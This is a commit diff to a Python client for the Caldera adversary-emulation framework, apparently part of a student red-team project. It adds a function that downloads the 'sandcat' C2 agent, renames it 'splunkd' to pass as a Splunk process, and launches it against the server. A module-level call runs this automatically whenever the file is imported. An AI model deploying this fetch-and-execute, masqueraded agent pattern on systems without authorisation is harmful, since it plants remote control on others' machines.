000940ba7b3aca16f5eaacf63ab6cd6a24bcbc0c
Fernando De Santiago <fdesantiago@miners.utep.edu>
2026-04-12 20:34:58 -0400

    create agent working

--- caldera/client.py
+++ caldera/client.py
@@ -2,8 +2,8 @@
 responsible for api calls to caldera and processing outputs
 '''
 import os
+import subprocess
 import requests
-from client import CALDERA_API_URL
 from dotenv import load_dotenv
 load_dotenv()
 
@@ -12,9 +12,32 @@ CALDERA_URL = os.getenv("CALDERA_URL", "http://localhost:8888")
 API_KEY     = os.getenv("CALDERA_API_KEY")
 HEADERS     = {"KEY": API_KEY, "Content-Type": "application/json"}
 # Agents
-
-
+def create_agent():
+	url = f"{CALDERA_URL}/file/download"
+	headers={
+		"file":"sandcat.go",
+		"platform":"linux"
+}
+	try:
+		with requests.post(url,headers=headers,stream=True) as response:
+			response.raise_for_status()
+			with open ("splunkd", "wb") as f:
+				for chunk in response.iter_content(chunk_size=8192):
+					if chunk:
+						f.write(chunk)
+		os.chmod("splunkd",0o755)
+		subprocess.Popen([
+			"./splunkd",
+			"-server", CALDERA_URL,
+			"-group", "red",
+			"-v"
+])
+	except Exception:
+		return "False"
 # Abilities
+
+# Adversaries (work in progress)
+
 
 # Operations
 
@@ -22,7 +45,10 @@ HEADERS     = {"KEY": API_KEY, "Content-Type": "application/json"}
 #Health
 def health_check():
     try:
-        r = requests.get(f"{CALDERA_API_URL}/api/v2/health", headers=HEADERS, timeout=7)
+        r = requests.get(f"{CALDERA_URL}/api/v2/health", headers=HEADERS, timeout=7)
         return r.status_code == 200
     except Exception:
         return False
+
+
+create_agent()
